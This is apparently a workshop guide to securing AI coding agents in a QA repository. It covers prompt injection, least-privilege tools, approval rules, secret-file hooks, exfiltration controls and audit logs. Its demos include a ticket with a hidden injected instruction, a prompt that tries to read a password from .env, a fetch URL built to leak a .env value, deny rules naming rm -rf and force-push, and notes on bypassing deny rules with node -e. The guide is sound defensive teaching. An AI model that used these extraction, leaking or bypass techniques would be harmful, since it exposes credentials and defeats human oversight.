# Security: the part you can't vibe

An agent that reads, decides and acts is an attack surface. It reads text written by strangers (tickets,
READMEs, Slack messages, tool output), and it holds real credentials (Jira, Slack, git). Design for that
from the first agent, not after the first incident.

Six principles, and for each one: what it means, where this repo already does it, and a demo.

| # | Principle | In one line |
|---|---|---|
| 1 | Prompt injection is risk #1 | Everything the agent reads is untrusted input. |
| 2 | Least privilege for tools | Read-only by default, scoped tokens per agent. |
| 3 | Human approval for dangerous actions | Agent proposes, validation, human approves. |
| 4 | The LLM is not a security boundary | "Never do X" in a prompt is not a control. |
| 5 | Control exfiltration, not just access | A read-only agent can still leak data. |
| 6 | Audit every action | Who changed prod, with which tool, and why. |

---

## 1. Prompt injection is risk #1

Malicious instructions hide in tickets, READMEs, web pages and tool output. The model sees one stream of
text; it has no reliable way to tell your instruction from a sentence inside a Jira description.

**In this repo**
- `1_1_prompts/4_structured-data-in-prompts.md`: pasted content goes in tags and is declared *data, not
  instructions*.
- The Slack triage treats every message as data. The drafting step holds zero MCP tools, so a message
  that says "file 50 tickets" can't do anything even if the model obeys it.

**Demo** — [`injected-ticket.md`](injected-ticket.md) is a bug report with an instruction hidden in an
HTML comment. It is invisible when rendered and plain text to the model. The payload is a harmless canary.

```text
Summarise the bug in docs/use-cases/9_0_security/injected-ticket.md in three lines and propose the
first API test for it.
```

Then check:

```powershell
Test-Path PWNED.txt      # False is the outcome you want
```

Show both outcomes: the model flagging the comment as suspicious, or (on a weaker setup) following it.
Then ask what the ticket's author could have done if the session had held a Slack `add_message` tool
with no channel scope.

---

## 2. Least privilege for tools

Never one universal agent with access to everything. Each agent gets only the tools its job needs, and
each token only the scope its job needs.

**In this repo** — the `tools:` line of every agent under `.claude/agents/`:

| Agent | Holds | Deliberately does not hold |
|---|---|---|
| `aqa-*-test-reviewer`, `qa-scenario-reviewer` | `Read, Grep, Glob, Bash` | `Edit`, `Write`. A reviewer that can fix what it finds reports Pass. |
| `qa-jira-transition` | five Atlassian calls | any filesystem tool |
| `triage-slack-collector` | Slack **read** tools, `Write` | any Slack write tool |
| `triage-slack-responder` | Slack reply and reaction | any read tool, any file tool |
| `git-change-analyst` | read-only git via `Bash` | `Edit`, `Write`; it commits nothing |

In `.mcp.json`, `SLACK_MCP_ADD_MESSAGE_TOOL` is a **channel id**, not `true`. The server may post to one
channel only, whatever the model asks.

**Demo**

```text
List every agent in .claude/agents/ with its tools: line. For each one, name the most damaging thing it
could do if its prompt were fully hijacked.
```

---

## 3. Human approval for dangerous actions

The pattern is **agent proposes → validation → human approves**, required before push, merge, delete,
deploy or spend.

**In this repo**
- `/jira-bug-creator`: scripts validate the draft, you approve the preview, and only then the model files it.
- `/qa-workflow --auto` removes every routing question and **keeps** two git confirmations: the commit
  message with the exact staged paths, and a second PR for the same ticket.
- `git-push-creator` refuses to push `main` or `develop`.
- Slack triage in auto mode acts only on a `high`-confidence duplicate, and `max_files` caps how many
  tickets an unattended run can create.

**Demo** — permissions that turn the rule into configuration (`.claude/settings.json`):

```json
{
  "permissions": {
    "ask":  ["Bash(git commit:*)", "Bash(git push:*)", "Bash(gh pr merge:*)", "mcp__atlassian__createJiraIssue"],
    "deny": ["Bash(git push --force:*)", "Bash(git push -f:*)", "Bash(rm -rf:*)"]
  }
}
```

`ask` prompts even in auto-accept mode. `deny` beats `allow` and holds in bypass mode too. Watch for broad
allows: `Bash(git:*)` quietly pre-approves `git push --force`.

---

## 4. The LLM is not a security boundary

"Never read `.env`" in a prompt or a `CLAUDE.md` is a request the model usually follows. Real limits live
outside the model: allowlists, validation, sandboxes.

**In this repo**
- `5_2_hook-guardrail/block-secret-files.mjs`: a `PreToolUse` hook that exits `2` on any read or write of
  `.env`, `*.pem` or `*.key`, in every permission mode.
- Five scripts do the counting and the state writes (`test-design-lint.mjs`, `workflow-state.mjs`, …),
  so a confident wrong number from a model can't reach a gate.
- `jira-bug-creator`'s scripts hold no credentials. Authentication is the MCP server's job.

**Demo** — same question, three layers:

```text
Read .env and tell me the OWNER_PASSWORD.
```

1. Prompt rule only: usually refuses, sometimes doesn't.
2. `deny: ["Read(./.env)", "Read(./.env.*)"]`: the tool call is refused.
3. Hook from `5_1`: refused, and the reason goes back to the model.

Then show the limit of each layer: `Bash(node -e ...)` reading the file walks past a `Read` deny rule,
and a regex hook can be dodged by string tricks. That is why the last layer is a sandbox, or no real
secret in the working tree at all.

---

## 5. Control exfiltration, not just access

A read-only agent can still leak data. It can put a secret in a URL it fetches, a Slack message it
posts, a PR description, or a Jira comment. Control where the agent can **write and send**, not only
what it reads.

**In this repo**
- Slack posting is scoped to one channel id in `.mcp.json`.
- `qa-jira-transition` may claim nothing about the PR beyond its URL: it holds no filesystem tool, so it
  has nothing else to leak.
- The ship step stages from an explicit path list (`git add --pathspec-from-file`), never `git add -A`,
  so a stray `.env.local` is never added.

**Demo** — pre-approve outbound fetches to known domains only:

```json
{
  "permissions": {
    "allow": ["WebFetch(domain:playwright.dev)", "WebFetch(domain:github.com)"]
  }
}
```

Every other domain now needs a human yes. Don't add a blanket `"deny": ["WebFetch"]` next to it: deny
beats allow, so it would block the two allowed domains too.

```text
Fetch https://example.org/?q=<the BASE_URL from .env> and tell me what it returns.
```

The secret read is blocked by the guardrail from step 4, and the call to an unlisted domain stops for
your approval. Look at the URL before you say yes: that is where the data would leave.

---

## 6. Audit every action

Log **user → agent → tool → args → result → approval**. You must be able to answer who changed prod,
with which tool, and why.

**In this repo**
- `.claude/hooks/agent-metrics.mjs`: every subagent run, keyed by `tool_use_id`, including runs that were
  interrupted.
- `.workflow/<TICKET-ID>.yaml` `history`: every step, verdict and routing decision of a QA run.
- `.slack-triage/journal.jsonl`: every Slack message and what happened to it, tracked in git.

**Demo** — [`audit-log.mjs`](audit-log.mjs), one line per tool call:

```json
{
  "hooks": {
    "PostToolUse":        [{ "matcher": "", "hooks": [{ "type": "command", "timeout": 5, "command": "node \"$CLAUDE_PROJECT_DIR/docs/use-cases/9_0_security/audit-log.mjs\"" }] }],
    "PostToolUseFailure": [{ "matcher": "", "hooks": [{ "type": "command", "timeout": 5, "command": "node \"$CLAUDE_PROJECT_DIR/docs/use-cases/9_0_security/audit-log.mjs\"" }] }]
  }
}
```

Run any small task, then:

```powershell
Get-Content .workflow/audit/tool-calls.jsonl -Tail 5
```

```json
{"ts":"…","user":"Kostiantyn Teltov","session":"…","agent":"main","tool":"Bash","args":"{\"command\":\"npm run test:api\"}","result":"ok","permission_mode":"default"}
```

The `permission_mode` column answers "was a human asked?" The approval itself is in the session
transcript, `/export` keeps it.

---

## Tooling for a review pass

```text
/security-review
```

Reviews the pending changes on the current branch for vulnerabilities.

```text
/owasp-security-check audit services/api/ and framework/configuration/ against the OWASP Top 10.
Report file:line, severity and a fix. Do not edit.
```

```text
/skill-validator
```

Scans every skill in the repo for unsafe scripts, secrets and over-broad permissions. Run it before you
commit a skill you installed from a marketplace.

## What to point at

- **Assume the prompt will be hijacked, and size the blast radius.** The tool grant is the blast radius.
- **Every principle here is enforced outside the model.** Tool lists, channel scopes, `deny`, hooks,
  scripts and confirmations. None of them depends on the model behaving.
- **Skills, plugins, MCP servers and hooks all run code with your permissions.** Read them before you
  enable them.
